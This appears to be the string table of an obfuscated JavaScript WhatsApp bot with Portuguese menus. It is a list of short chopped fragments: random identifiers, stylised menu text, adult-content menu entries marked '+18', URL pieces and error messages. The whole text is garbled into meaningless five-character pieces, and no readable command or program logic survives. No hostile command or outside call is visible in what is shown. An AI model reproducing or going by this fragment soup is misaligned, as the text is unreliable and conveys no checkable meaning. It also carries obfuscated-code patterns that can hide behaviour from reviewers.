'𝐏𝐑𝐈𝐍𝐂', 'iya', 'grupo', 'sGaCO', "oc 1", '/info', 'AGSHS', 'ezZvI', 'OrxMV', 'onWha', 'oggVa', 'erbBM', " LEVI", 'qtLws', "ós a ", 'putad', 'JmbjD', "• ID:", "u /10", "ig es", " LEGE", 'zgoYF', '1|5|2', 'QhgqS', "ᴀʏ🏳️‍🌈  ", 'gRQHd', "us: N", "was b", 'VuYqY', 'abOGk', "[❗] E", 'Tenen', '3f3e0', 'EusRk', 'Ningu', "o emp", " No G", "p ani", 'pzIKQ', 'SISTI', 'img_h', 'info', "o foi", "\n┞┧\n╰", " ERRO", 'ico-m', "RA DO", 'celul', 'CSVBK', 'ujQaQ', 'nvers', 'file', 'OZlSi', "APER ", 'yAZXy', '.size', "ê É: ", "a opç", 'rrMzZ', 'ZdWZi', 'repea', 'pZeaQ', "rio: ", 'jyaOk', "haça ", "Vara ", "A exp", 'lYfpX', 'FXmKl', 'LIQIz', 'Rooh_', 'iPsvz', "ja ma", " isso", 'TiKkr', 'HiBiB', "já vo", "😴🥱\n*A", 'CMKrD', 'VhdVa', 'erro.', 'qEZNd', 'UfeDm', "𝗬𝗔𝗠𝗔 ", 'rdido', 'nKjgv', "\n\nBot", 'elFxG', 'JaNnD', 'PSIvv', 'rbFlm', "?, Qu", 'bgadN', 'HvRRQ', 'ynNqD', " 𝐍𝐄𝐆𝐀", 'cido*', 'inval', "ult -", " *Pla", "𝐄𝐎𝐒 𝐎", 'dHoFF', 'JEure', "❄️ 𝐑𝐄𝐍", "ara 1", 'zPJOd', 'teTWS', 'hvreu', 'NxgeM', 'dorVi', 'ode', 'vHtbz', 'pjESX', "s rou", " a pa", 'XUfSr', 'e/zfm', 'CyLnc', 'WYrDu', 'uWLMq', "a foi", 'Axhrw', 'QttOG', 'lPbEh', 'sados', "a De ", "𝗔𝗧𝗔 🇯🇵", "Só ad", 'OspfZ', "sso v", 'upZds', 'QFeDZ', 'yXbhb', "Boa t", 'IMooc', " GRUP", 'ento.', 'ypIGe', 'vado!', 'trang', "stá v", 'pWIKB', 'aaHWz', 'oopmP', 'Pmlvz', 'EwOIa', 'Sourc', 'MEMBR', "isa u", 'DseCx', 'igite', "te e ", " dele", 'disab', 'PhpxM', "Voce ", 'Descu', "ento ", 'b8289', 'vRxBQ', 'uLEiD', 'ile/3', " +│\n\n", "ode a", 'KdKfe', 'vZfzZ', 'Upmul', " os l", 'HMyRy', 'xvHMr', "\n*Tem", "nha n", '98923', "vip o", 'hVwDn', '2|3|1', " ENTR", 'GwDoI', 'lQqSP', 'ofMQZ', 'hHUgB', "tem 1", "ros* ", 'iHoKW', "ro ad", 'vel', 'wa.me', ". E a", "Ele m", "um so", " \n\nX ", 'mQwjT', 'UJFNq', "(o) @", 'swTag', 'EPGUl', "75. ❄️", " excl", 'aixaR', 'YVSnu', 'GjCmP', 'iWzuH', '7d555', 'zDnXN', " 𝐀𝐍𝐓𝐈", 'BAjPo', 'ovxsW', "A Cad", "ono f", 'sapp', 'JvWBo', "%\n│‣🌬️", 'bzREe', "em ★ ", 'UxpaA', 'rbcjz', 'QwsDx', "e não", 'PypMQ', 'IRADO', 'zllnA', 'nPWxh', 'jqnRT', 'Descr', 'saird', 'iAHYa', '~_CON', 'lGXif', 'AATIq', 'ijigT', 'geSRn', 'BkQwl', "r: \n", 'zQhXF', 'FIGUR', 'zDvkK', "em au", 'ARrvg', " , su", "ANDO ", 'VztBn', 'XpfGu', 'zuwHz', 'kYlyB', '-avoi', 'HxLym', "e mor", "sse g", '-msg-', 'QgYWE', "diz q", 'GaHqU', 'NNIst', "XT (6", 'morto', "já fo", "onta ", 'ex.js', 'ITARM', 'bJmZD', 'XkaCx', " NAGA", 'vyKey', 'LprUN', " Lay ", 'RjVzm', " desb", 'vozme', 'rCnEl', 'visua', 'dono:', "ela s", 't.lyo', 'ext&r', "oa Ma", 'decis', 'sbmEy', 'lzzic', 'ZssjN', 'HXPSn', "erne ", 'VsObR', 'oUQNk', 'BoUtr', 'erBYv', "r nov", 'JglEr', " O ex", 'cNTev', "jar a", 'OaxgN', 'FiwUm', " na l", 'jAqGq', 'qDuIk', 'STomI', "25. ❄️", '05435', 'KWNYQ', '𝐀𝐋𝐈𝐙𝐀', 'knDrb', 'crogv', 'delcm', 'nt=on', 'e-api', 'oWPHD', "z\nExe", 'sMcAZ', 'Dwiea', 'hJrpe', 'EFjjk', 'iPSpf', 'zMDlR', 'TyPRu', '7a325', 'FAJFS', "ai ma", 'elled', 'CYXHE', 'uDdaE', "ovo t", 'FRhRU', 'batio', 'dGyqt', '2|0|3', "gue S", "Nome ", '*Part', 'QQeXW', '1jzgK', 'FUchP', 'cNmKa', 'oxSvY', "ing 0", 'CrQVT', "ds na", 'rmbqo', 'XsOaY', 'leTRj', 'ENOEN', 'cNJPD', " Funç", 'posto', 'IyrGq', 'pvZyx', 'tados', "💎 𝐌𝐄𝐍", 'fQAnm', "BADO ", 'nkDfX', 'OLWiX', "ltou ", 'RDLOQ', 'keado', "sent ", 'Profi', 'OytdK', "udo, ", 'LxJec', 'wwLbR', 'uQbPk', 'RXkAk', 'IqTZN', " idio", 'lYImg', 'obrar', 'CkpqW', 'zyUQs', 'isinh', "e nun", "*\n*Te", '22e4a', 'e2989', 'RsVvx', 'XHBPJ', 'VZozl', 'ttp6', 'smZNZ', '61347', 'mVUdw', 'f-sti', "in *@", "e Ati", 'GddGL', "O MOD", 'evela', 'ti-li', 'mrpev', 'prOav', "\nEu n", 'ha🎉..', 'idkqf', " PALA", 'eCOCj', 'BYpRW', "15. 🔞", 'kdtGT', 'not_a', 'CJdBa', " de q", 'HLUIq', 'zmhXf', 'NDewF', "r e q", 'hmWXn', 'OxQRe', 'RXcrj', 'wzQWd', "55. ❄️", 'kxeBW', 'ikJKz', 'EmySq', 'eZCjP', 'PROCE', 'SpcDv', 'fQVpt', 'wnXHM', 'adrip', 'PIJDw', 'oQbKz', 'boOGm', 'yoHSP', 'dpmiF', "de:* ", 'teStr', " , fo", 'Vdlge', 'XwrNA', 'ry=', 'Jxsat', 'Ugwql', 'VVRTf', 'RUYDE', 'OUqfm', 'QWZjX', 'DOS/E', "m 50 ", "𝐎 𝐗9 ", 'fOkZx', 'mLuJA', " 0 -p", 'cKDbz', "a ano", 'ity=n', 'wMGIY', 'mFeFl', ", pro", 'nZiwj', "ro 🤧", "igar ", "em lá", 'er_vi', 'dio2', 'cloud', 'eaypP', 'mgcEk', "ava a", 'rSEqp', "/ @+/", "ossa ", 'LogUq', " sufi", 'SYhOb', 'DHcSa', 'bNneg', 'xOAuI', 'antid', 'vUiYn', 'Minec', '3.118', "qui p", '-4ef4', 'ter-S', 'JHbKq', 'nfere', 'zxTHI', "as tr", "os 🏆\n", 'vIYzA', 'TlMkp', "o her", 'Ofajg', 'Creat', "𝐚𝐫 𝐟𝐮", 'queno', 'tOlmm', 'jiXBy', "ns po", 'alent', 'pe=ka', 'SUbWV', '://er', 'klidk', '_STRI', 'Menud', 'YlvoO', 'GyYwz', 'MErGG', "۪    ", 'XuhpF', "id js", 'UIipn', "ios q", "o Sim", "nte: ", 'HzoqI', "𝐈𝐂𝐈𝐀 ", 'YtZgu', 'ZEMZH', "e 5..", " chut", "de su", 'sin', 'QMJyL', "utar ", "O gru", 'JjdZW', 'pop', 'ções:', 'QvMij', "do\nEx", 'ffmpe', 'mDKKX', 'Xpbdc', 'ionan', 'ZDfIE', 'soJPD', 'laint', '___-_', "0% \n\n", " Titu", 'DZRYA', 'insta', "❄️ 𝐌𝐀𝐃", "s, é ", " 𝐀𝐌𝐈𝐈", 'ons/%', " eles", "rar u", 'zqBUL', 'ima.', 'RdJgn', 'west&', 'strat', "ar co", 'mes', 'mqSTK', "_fmt ", 'dWclp', 'form-', "te a ", " isto", 'ca032', "-ac 1", "a? Te", "d da ", '[⚪]', 'rtinh', "nte! ", "Bot c", 'onsol', 'edit', 'MXRJY', 'vAILS', "2 7di", 'XXZDp', "imo, ", 'pp-st', 'PMPRI', 'XhPoM', 'cedem', 'UUWsk', "NE OX", "seu, ", 'mbSqc', 'ezrVJ', 'RbHhK', 'vUHTR', 'cRjmC', 'bRDb9', 'isRec', 'ODonx', 'dHLSj', 'BHHaj', 'tema:', 'mFIKw', "SÓ EM", 'sGoOl', 'UQdRF', 'rg_av', "a / m", "o alu", 'nayan', 'kjgTE', "\n\nPar", '𝐏𝐀𝐆𝐈𝐍', 'arDQI', 'Posta', 'keXTy', "  🚀", 'criou', "ero ", 'QahZp', 'over.', 'achaç', '8uDCW', 'DiQoC', 'YHnCn', 'KEkbV', 'GEjpX', 'http', 'vYswI', 'lyINX', 'ulVuJ', " / Ou", 'XSpAv', 'NLFlw', 'com/S', "31. 🔞", 'ASFTK', 'undef', " 𝐖𝐀𝐈𝐅", 'lOZUN', 'DLDOb', "u ( ", '5556b', 'xMOZt', 'OJuAJ', 'avada', 'mfzHZ', "irir ", "Um ca", 'NlTTF', 'PSwZc', 'VRUGe', 'rnaDq', 'matem', 'dQdXW', 'ario.', 'IybDS', 'LAGAm', "SUN &", 'PPfsW', 'TUKDS', 'cpBjz', ". Ago", 'rankf', 'nZCWB', 'bbfde', '5a9d1', 'exEBl', "ig fl", '2GqzCRf', 'ujpuB', 'OUFTs', 'xKrKd', "PLAY ", "De Sa", 'GPPfv', 'EEhiU', 'KzNPb', 'CIyJT', " 𝐕𝐄𝐌 ", 'ack', 'eight', 'speci', 'cJIIf', 'ietar', 'nEzyM', 'xADsN', 'FOOLt', 'WuXvH', " 🥳", 'ntNtG', " e ", 'iTHfF', 'MMphZ', 'Unida', 'pecif', 'WQWTJ', "bom, ", 'leoff', 'Aswbf', 'SDkyh', "ds, m", 'ERipe', 'versã', "de áu", 'hDcjf', 'BqVxP', "só am", 'HlYUq', 'riJOS', " do e", "oc ka", 'packn', 'NFeWq', 'GnIpy', 'GcVtb', '50e84', "é fei", " 😕", " só f", "16. 🔞", 'doubl', 'cmd_m', 'QXzCE', 'ança.', 'ile/7', 'eAALP', 'jRjNu', 'pXAGs', 'ident', "vai e", 'IfgGW', "po, n", "ois p", 'pre-k', 'WGEso', "ema A", 'bMHzQ', 'pcyNl', 'QIqXN', "ou a ", "o nor", 'rLNK.', 'comba', "cê fe", 'ndexO', " vali", 'KZKMe', "ASTA ", "xo ", 'cusad', 'racas', 'Archi', 'swDeQ', 'mkEQC', 'then', 'kuJSJ', "\n๖ۣ• ", "or 2:", 'rCQeY', 'w/gif', 'ausên', '.0.po', 'dmpyp', 'kPRJu', 'ENORE', '93g8n', 'birds', 'NHIvt', "ada e", 'ZSEpC', 'JbFeX', 'HbEuk', 'LOpSN', "9. ❄️ ", "rar v", " os j", 'espno', "s pro", '-logl', 'ados.', 'IYgnP', 'bNPaT', 'ont.w', " a(o)", 'fkyTn', "ogue ", " NUNC", '𝐄𝐅𝐄𝐈𝐓', 'xgtJb', 'do:', 'isRea', '81989', 'BCdDG', 'qZtJt', 'yZRsP', "OBU2 ", '*USUA', 'aMKfd', 'uunic', 'ore-l', 'AjyMW', 'PTYcr', 'TrRnX', 'mMokD', "em hh", 'RtVuJ', "msg\n\n", 'bqhVR', 'quFjf', 'Nbrkd', 'creFK', "não b", 'isarf', 'QuVpQ', "\n▄▄▄▄", 'PvAPT', 'CpaHj', 'WAvDE', 'FjbKc', "ld, q", 'viar!', 'Yiqcu', 'tWQaD', "er WA", " você", 'oUcFx', '*🗿RAN', 'sRQPH', "am fr", "😈 _Er", "nas a", 'Dmdc4', 'u!❌*', 'mwniY', 'ZPmwL', 'WkEop', 'UVYyG', "ido' ", "ao cr", 'VyHkA', "Seus ", 'Nebdz', '-CjIB', "\n/﹋ 🅴", 'aFluq', 'HGjLd', 'SSeFf', 'JZZOO', "va né", 'BHtaY', "OD\nht", "o 😝", 'VbJeP', 'ame.j', "p azu", 'IDFyp', 'wBAJh', '~...*', 'talke', "ado p", 'zzAcM', 'KAXES', 'rmake', "es.. ", '12|7|', 'nsfwt', "a tir", 'QAyOQ', 'ofbyy', " 𝚽𝐈 ↯", 'HMcKi', "%😂\n\nE", 'AMEky', "TÉ MA", "e, su", 'HWYyS', 'iTzTO', "te, s", 'ZtdFZ', "sse G", " tive", 'ikKlf', 'fnk/M', "ndo é", "10. 🕹️", 'jhIEB', 'dMaeW', " uso ", 'sEaeF', "ara c", "\n• *C", 'KpTtO', 'KNyxV', "c sim", 'GLPeb', "\nEste", 'NLDBP', 'oycKP', 'zaSbB', 'lockc', "ja ve", '_v4_1', 'bRhQP', 'cdLUu', 'ovtbu', "SA SE", 'conqu', 'INIDO', "o Pre", "+18 5", "mo. S", 'YLukh', 'nwZuS', 'iTcVO', 'shnam', "ndo s", 'cuLCv', "Esta ", '.webp', "over ", " dono", 'zjnGh', 'Fxusg', 'bjUHV', 'QOgli', 'NnYyG', 'mPnAw', 'fvCFb', 'YhEVB', "uma n", 'TTaTc', 'hGMcP', 'HIZwU', 'TXnDR', "𝐎𝐒𝐎 🔞", 'RVTCK', 'elha.', '.posi', " anôn", 'mes2', 'vasco', 'enjZQ', 'WlmvO', 'fy.co', 'rgtm', 'ZEKxq', 'ncdhI', 'GSJQE', 'ADD_2', 'SYPYh', 'GhCgT', 'IW-Bf', "com b", 'fundo', 'iDjDh', 'ohHma', 'lMoOy', "a(s) ", 'XuICV', "da au", 'AzDCv', "m a l", 'bangp', 'hYFtV', 'bvqFn', 'listl', 'swtjr', 'KVQFX', 'ZlPsN', "vo do", 'vLKVu', '⋆⃟ۣۜ᭪➣', 's/Ccl', 'Leave', '1.5.7', 'gado*', 'on/pi', "te IV", "[ Gan", 'ilpxx', 'JinUP', " prim", "er um", 'vWmQB', 'NsFUd', 'CwqOS', 'PSRRI', " Núme", "s. El", 'R_A', 'vPyZO', 'ijPkA', '.19.1', "sa de", 'rWdxC', 'AkllF', "🖥\n6 -", " FRAN", 'eatór', "Pv3 a", 'LLXMZ', 'LGjXT', 'aywvv', 'PJAFy', "e con", " à in", 'GBsnE', 'vDuxy', 'gTWzB', 'wcnFB', 'sgnaj', "M MES", 'ꔷ⃔໑࣭࣭ٜ', 'KZyes', 'wDPpI', 'aru', 'nidCV', " 【✔】ʟ", 'XpSnb', 'ook2', 'RsQDX', 'GANES', "de: @", "91. 🔞", 'CbSOq', 'XleCS', 'a(s):', 'iada.', 'bHPFJ', 'RbdmN', '𝐈́𝐃𝐄𝐎𝐒', 'relat', 'idade', 'wfEoo', 'momen', 'arde', 'OiMwZ', 'XERGV', 'Kzbuc', 'jyfTM', 'odobr', "❌ Voc", "*\n*2 ", 'ZJcqr', 'jnKkR', 'LLAVd', 'OKnmJ', '|1|3', 'zrAcL', "💥 𝐌𝐄𝐍", 'WXBfP', "oje, ", 'Tenho', 'QWqWh', "ão II", 'cBVok', 'Type', "e sai", " Leve", "r Web", 'GIHAQ', 'heter', 'edxoX', 'ize=3', "𝗨 🇯🇵", 'ovgWP', 'TmfmS', 'fNTuW', 'icont', 'IRLFb', "> @", 'po✔️', 'XlySn', 'SMmuZ', "o Nas", 'cnnxF', 'APKFZ', 'xdybo', "ter o", "so na", "❄️ 𝐏𝐑𝐎", 'inks.', 'goQyc', "ou be", 'thBMn', "o men", '5a286', 'imXdH', 'a756e', "uma s", 'entat', 'Fkqil', "𝐑 𝐎 𝐋", "ARA U", 's/car', 'thMDa', 'op1|o', 'fnZKP', 'yUzNE', 'Ewydc', 'nAqYK', 'AkwFr', 'Tipo', 'agem?', "20, s", 'tDuMv', 'QsSLJ', " Mest", 'ttihn', 'd.opa', 'SVvQc', "ou ma", 'l/bra', 'VERSI', 'CIdIQ', "m, nã", 'iovqC', "io, u", '25.', 'CebZe', 'istro', 'WamVa', 'trarF', "- Não", 'mWGZp', "ocê é", 'sdSRC', 'ele%C', 'DDGje', "RASH ", 'Hdpiu', "  mas", 'escud', " DD/M", 'myADy', 'UmxiQ', 'ICrec', 'rBfAb', 'JnBCc', 'tirad', 'Cxwmp', 'bzxmK', 'hMIIW', "se ñ ", "\n\n🗣️ 𝐍", 'xnPXA', 'FAlID', 'ObhLg', 'ormat', 'QptvQ', "u*\n*", 'VFahJ', 'IvgYw', "á cob", 'KWXeU', 'inal', 'KbJwW', 'necta', 'ons/', 'qxkhT', "o as ", 'TlRlL', "ha!\n\n", 'iste1', 'AuCIq', 'ack/.', 'YBmed', '8921f', 'utm_t', '*erro', 'xrMff', 'mRaYa', 'BuCUs', 'ibiUB', 'xZQpk', 'MmEEO', 'MqKGh', 'lxQOZ', " Use ", 'SAlLa', 'marqu', 'XrFCO', 'nPara', 'dvert', 'perSc', "]~> ", "cas a", 'CGcfo', "ᴀᴛ Cᴏ", " send", 'VyzYO', 'sehcv', 's://a', 'eXZIC', 'sJvda', 'ZVpqw', "  [", "i alt", "go 1", 'wLgmb', 'cvIXz', "old @", 'lize', 'ZWKLS', "ro: @", 'xfVwu', 'OdABz', 'BTvCi', 'WfTgi', 'UYijb', " 𝐀𝐍𝐈𝐍", "ۣۜ᭪➣ ", 'n.y=-', "as ha", 'GBTkF', "r o s", "bo ma", '31615', 'Xrugb', 'zado,', 'bLjIf', 'peyZW', 'ira', 'izaçã', 'uQhxP', 'sts-f', 'OLNGn', 'ytsea', 'vlltP', "3 ] ", 'pAAmG', 'yjQbW', 'Rovnn', "do:\n", 'iUqLw', 'Nuebc', 'eLoLn', 'eNNPr', " ེི⁸⁸", 'wrYEF', 'estim', 'QXUqQ', 'YnXsO', 'rVaMe', "e bod", "u o c", "\n║\n╟✼", 'dEsYn', "cê em", 'lwpmT', 'hAUqr', "o nom", 'NlmXO', 'ZAÇÃO', 'wgQOz', "/3\n║\n", ", est", 'Ijtgt', "ra ob", " NANA", "\n┌─⊷ ", 'ivLyE', 'badDe', 'ckcmd', "hor s", 'VcaqJ', " de\n𖣘⃟", "ium c", '333', "ig ga", 'vLPvq', 'MYLzb', 'herma', 'nTcTT', 'EOnjY', 'Mods-', 'WPwkP', 'Yyvsm', 'MuaZI', "em, s", 'AiMDH', 'nvfQw', 'ItiNA', 'pendi', 'YbrxF', 'VaaoM', 'LonON', "a ao ", 'antiv', 'rtrea', 'BzuLY', "0, 1 ", 'webco', "so ir", 'kTAPj', 'hRSyH', 'MFyAU', 'Eaoqo', 'TI_SP', 'FKZJk', 'gwkHU', 'Odele', 'OCswL', 'onALB', "\n\nd é", 'IJWPC', 'JEEvf', '2|4|0', "rte d", 'o-bra', "Last ", 'BQiTN', 'AkUA8', "omo 2", 'tulo|', 'kVDna', "er at", 'pi%26', 'ztSBn', 'ocfGu', 'QfWpx', 'empré', " repr", 'fvWyu', '699', 'JGkNO', 'oALIp', 'vavel', 'Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸', 'bela.', 'GPSOe', 'NIVVn', 'qNfpd', '12036', 'wnhpY', "88. ❄️", 'MNtwA', 'CtLZg', 'ɴᴄʟᴜɪ́', 'ativa', 'JvEfn', 'mwrJh', 'Horar', "\nPor ", 'rdeu', 'zCjhI', 'kWUhD', 'possí', 'gWFuO', 'LrnzQ', "\n╰───", 'cqFUY', 'FaKso', 'NVQEc', '988c9', 'PyMuf', "dos:\n", ':-1:-', "rd b", "l Z -", "ix co", "o esq", "a gru", '6|7|2', 'yVUr4', 'VjcTE', 'rGvPv', 'iDPzY', 'REwcu', 'KBTfn', 'wncZN', "vo nã", 'bVLQv', 'qkoNF', 'htVzo', "\n│𝐒𝐢𝐦", 'FDoLS', 'wbBKp', 'n.gra', "a : <", 'ecrio', " peso", 'UTQKD', 'cmdpr', 'oiFYQ', 'HQDVQ', "do si", 'elgb', 'gsQaT', 'qiPda', "inue ", 'log', "ssa i", "    💨", "1 a 1", "Só é ", 'LpjCI', 'aGZXb', 'XsFbn', 'cJDaf', 'hMwTN', "uém e", 'CMKDR', 'imgpr', "o mar", 'GgSTf', "STRO ", 'wIdep', "da ho", "Só di", 'H2Dcf', 'FTtLJ', 'qNyOS', 'obgzz', "no so", "\n│𝐂𝐨𝐦", "𝐁𝐈𝐎: ", '|1|2|', " \nSua", ")\n3. ", 'VV9yk', 'rFcsm', 'Kqgew', 'ar!', 'lRAAY', 'ias*', "figu ", 'RnbGL', 'gdfsk', 'miner', "e alu", 'ium', 'Cabo', 'ScrsI', 'Qowdv', "ada a", 'en-cl', "em es", "𝐋𝐈𝐍𝐆 ", 'aDUbN', 'qXzlQ', '://tw', 'rNQaW', 'VPTYL', 'TCEsE', "a ape", 'WQlMA', "Por m", "tar n", 'XbQaQ', 'plano', 'uuiWA', 'MIuNd', 'f=94:', 'xgCOT', 'oRIAF', 'yJkdM', "o naq", 'ebook', 'kmDft', '|0|1', 'aExJz', "i sti", " cara", 'jeSwt', 'foot/', 'HnAyl', 'hQdsA', 'FileS', 'sBKcm', 'ande,', " pont", "ma vi", 'cker', 'KEity', 'EAzdy', 'lMzvn', 'H8_0i', 'vmmuw', 'uulHW', 'IYtky', 'oQxhv', "IS NA", 'JCpVe', 'JUNGL', '01ff8', 'dNNdP', 'Dayxa', 'WsqST', "\n\nVoc", 'NqOiY', 'Cwvqr', 'datm', 'value', 'orVhX', 'dmzOO', 'JRugO', "MS!\nN", "ARA F", 'dos.', '🚢👨‍✈️', 'prMvn', "ÁRIO ", 'IOghO', 'hJExk', "or co", 'qryxY', '.0.fo', 'XaluN', "s col", 'WsJUE', 'zgiQm', "  🎰  ", 'pdVfI', 'Stick', 'ZnoMe', 'dor..', "uto r", '𝐄𝐒𝐓𝐈𝐍', 'DoGp#', 'VGaJK', 'iquei', " este", 'mvyDX', 'hdHRD', 'UjXju', "ão ag", " 💌  ː͡", "/3. N", "nto j", 'OTHIk', 'oBGAB', 'FFQuW', "25 ", 'yjzDx', 'NRcDG', 'kYkDk', 'HjoKH', "𝐘𝐀 ❄️", " todo", 'finir', "l de ", 'Reini', 'zBjyw', 'CGptw', 'uioML', 'vAcrc', "Eu nã", "o vai", 'om/', "\n\nDes", 'maker', 'FoTUk', 'lvngz', 'tornx', 'NqCgL', 'nks.j', 'vAfqm', 'trou,', 'luNyK', 'com/f', '𝐁𝐑𝐈𝐍𝐂', 'Zisef', 'd4-a7', 'a)..', 'IeDpC', " ou i", 'XNEki', " Minu", 'Solda', '899ea', 'EPDaL', 'iMsPr', 'RgQLh', '2d20', 'feJUQ', 'ds.', 'hando', 'orPio', 'gUqVx', 'voto_', 'NqkBI', 'YvZoj', 'xIjNq', 'XjZvk', 'FKjHr', "no bl", 'jtSSv', 'vIzVD', "m o u", "r. é ", "os. D", 'ly=Te', '-rank', 'nned.', "lers ", 'FbSoz', 'const', 'EzcOj', 'UCEXF', " *Hor", 'hvpae', 'UTSab', 'CEFeH', "ia: ", 'BTpSg', 'Djxiq', '/GTXY', 'cas2', 'FpFOh', 'cSqbD', "asco ", '*APRO', 'dRiCP', 'xaxjw', 'BUWRZ', 'YQNdH', "\n\nExe", "ou 20", 'eName', 'PSKkF', 'image', 'dvfTl', 'ZEcxO', 'basta', "Deu ", 'qreuI', 'RuacX', 'SvBQo', 'lAQFm', 'OzNqm', 'o_VbS', "v\n\n- ", 'DZZGL', 'vRZZe', 'PXIbB', 'Elqvx', "🛠️ 𝐂𝐑𝐈", 'nlvVq', ". Bri", "m ess", "𝗘 🇯🇵", "p dar", 'gfnaE', 'OfhEI', " Boas", "nto e", 'SBANI', "Y\nhtt", 'GPFdV', 'iBAYI', 'SBtzc', 'angea', "de li", 'convi', '_rank', 'JAOMc', 'ewYJy', 'RbzjW', 'qgcPT', "PER L", " quei", "ber o", "no po", 'kGRBN', "ra pa", 'agram', 'iGeFh', 'JYGeA', 'kkecj', '61102', ": ⟮ ", 'NkVUs', 'GBoeM', 'pRGvV', 'raucT', 'qUBVc', 'PrFBR', 'SELHO', 'dAttr', 'LwQUo', "r uti", 'DBrkv', 'e6947', 'SMgZW', 'NOnoI', 'graca', '5|6|0', 'zAJdQ', 'KAfUp', 'uarde', "ite C", "UPOS\n", '.zip/', 'be.co', 'JfQFa', 'kLKhB', 'WYHUU', "w 30s", 'bNyAy', 'nther', 'waRXM', "á os ", 'VUuKq', 'ify.', 'RWlkq', 'OjCcq', "nte n", 'SnVlt', 'bQWXJ', "mpra ", "\n╭╍❆╍", 'jfnvO', 'kCkpF', "rece ", 'eUKTL', 'KCPLB', 'xklZe', 'nazis', 'garHk', "B: ob", 'PEDID', 'tecer', 'qeXxZ', 'uXHLj', "o: O ", 'iste,', 'xyQTn', 'mXYlB', 'kPSrg', "ra o ", 'ga%20', 'XHQCd', 'xryDC', 'oQrSM', 'onseM', 'nAznW', 'JfxrR', 'áximo', 'XwmYd', ". Por", 'PdUKY', 'zQthS', 'yhBTe', 'qsDBt', " tabe", 'AZqLK', 'oXYHq', "𝐀𝐙𝐔𝐋 ", 'qNiQz', 'GwcaV', 'UahAd', 'fiand', "r que", 'KmPtw', 'sVIHi', 'KqBQM', 'xwbCQ', 'cxuno', "u esc", 'on/AN', "nto s", 'MiM-o', 'dEwYf', '3|2|4', 'OtNdf', 'regio', 'eIkbd', 'jlNNU', 'zkzal', 'QVhlM', 'oFTII', 'vPyvk', 'lo|te', 'GuRSj', 'aCQah', 'rIpHv', " a ch", " Hipe", "\n3 - ", ".. vo", 'aNAVY', 'mgboY', 'ositi', "𝐓𝐀𝐌𝐀 ", 'zkWJl', 'ends_', " SAKU", 'incad', 'feliz', 'NkVUQ', "NG DE", "0 Gol", 'XFWgl', 'SxROQ', 'yBsVe', 'LEFpu', 'BghrA', 'spCqC', 'lqqJK', 'vUKmI', "são a", 'VWZJb', '4|7|6', "o Wha", "po, e", 't..', "ão ac", 'iqJXt', 'njOBt', 'FPapt', "lhi, ", 'GMXKu', 'mhkRr', "gos 😉", "o (Nu", 'gYkMh', "i aud", "\nUrl:", 'TILIZ', "ou 't", "❄️ 𝐌𝐈𝐃", 'FwHOJ', 'nBAOp', "🇯🇵 𝗡𝗘𝗭", 'lida.', 'com/Y', 'jwilq', 'ILYFW', 'RmgUB', 'isten', 'bHrwL', "SO DO", 'tJtMn', 'uKCUU', 'WYKuI', 'LLfcr', "veva ", 'bSMcs', 'yoJah', 'ToMJH', 'FeiN,', 'yGijB', 'blue', 'UYmIx', 'NQIwZ', 'k-X19', 'tgHpu', 'tOVfF', '21/ap', "ig uz", "s foi", "eto J", "eu ap", 'una', 'rcmds', 'TBeOX', 'splic', 'VlwAg', '/mpeg', "ts ko", 'FzfXu', 'gulho', "e, po", 'dcpLp', 'giTNb', '𝐏𝐎𝐒𝐓𝐀', 'pIveV', "m par", 'isyzX', 'luuck', 'kOJyz', "vo ne", 'fica,', "78. ❄️", "er pa", 'aOTzz', 'thumb', 'EeWEb', 'bPATl', 'utGTT', 'omOuY', 'soais', 'tpmpf', 'iJVyn', "uiça ", " ou s", 'orajo', 'yoPga', "ink d", 'DPdFI', " Sigm", 'PBraN', 'WVCTb', 'atégi', "--\n", 'citaç', 'EdrPo', 'HNIIJ', "tmo*\n", "ará 2", "em de", 'fBzWN', 'BOLAF', 'bHaNO', " deci", "me pa", 'XQiMG', 'AIHzN', 'eHNEd', 'HILIK', 'umesm', 'gvnmc', 'axKho', 'gta', "[❗] 1", 'fTjQD', 'vrwIN', "lds\n\n", 'WdrCk', 'NapzY', "e é 0", 'hits', 'wzNwr', 'expor', 'TSNVW', 'mv2cd', "ta ma", "m a c", 'pIkJZ', 'BLzTQ', " entr", 'XSIJI', "*DEU ", 'tects', 'UBndX', ':v]se', 'xsGbc', 'fMwWL', 'carre', 'zULnL', "⚙️ 𝐑𝐀𝐌", "% ❱  ", "ds. M", " 〕\n", 'Tskjz', "ser's", 'VzLxa', 'KBcxI', "de 1h", 'llo', 'ubsti', 'a7516', "éns: ", " simi", 'usKdh', 'kpLTq', 'lMuyg', 'cZEjz', 'cdzlk', 'HYHxR', 'HigKY', "s pen", 'ggiFi', 'cote?', "𝑫𝑬𝑶 2", 'erifi', 'agp', 'QzCFj', 'tDeOj', "vo. P", 'ZWKxT', 'RyBES', 'gpHfc', 'gram_', 'IddWu', "e, qu", 'ltero', 'UnExM', 'rando', 'HJMCg', "Uma j", 'lrmYH', "te me", 'bBRGd', 'ot.', 'exRWL', '_pht', "e der", 'QLMsC', 'DbdQK', 'xBAvH', 'yBKZl', 'RpkCF', 'jQQlP', 'ZRUXv', "so, u", 'DyPxX', 'CqnoS', "\n𖣘⃟   ", 'ZdFdi', 'uzu', 'qSaPE', 'iMeaw', '𝐀𝐃𝐈𝐍𝐇', "ie Oc", '.goog', 'fuIXs', 'UOgSj', '10)', 'FKrAQ', "terá ", 'nEakV', 'DBMCF', 'lnvDv', "𝗥𝗜 🇯🇵", 'minho', 'ymsUn', 'REigD', 'WzFJP', "SSO D", 'DkNBo', 'xxNTp', "u a d", 'kdhwO', 'XMXQc', 'BIZ-N', 'CPsGc', 'Numbe', 'lxJJG', 'ukJnZ', 'rVapn', '0a880', 'YdoWK', 'call-', "e ou ", "e usu", "ual m", 'ICIAD', 'gsUFM', 'do(a)', "𝐔𝐒𝟐 ❄️", 'apwks', 'GJMqX', 'LbrEB', 'hora:', ", con", '_MOD.', 'IlyFw', "e edi", 'yBwvU', 'JjLdk', 'ang/%', "t, se", "𝐄𝐋𝐇𝐎 ", "de se", 'ermel', 'bass', ", pv ", "ua te", 'rxpbF', 'ORTUG', 'yfIZc', "te: h", "U ELE", 'FJOOS', 'jtRTy', 'ndas*', 'BPxmK', 'tab/d', 'LJujq', 'a222f', 'sica:', 'syTon', 'RgGiw', "cmd b", 'sNcYq', 'pjrPi', '7NgrL', "LD: ", 'legra', 'AJDfs', 'rande', "SEU P", 'tent.', 'fHDdr', "iro u", "86. ❄️", 'speed', 'wDFzn', 'gif/g', 'Apena', 'tuRnv', 'PlxFp', "os. 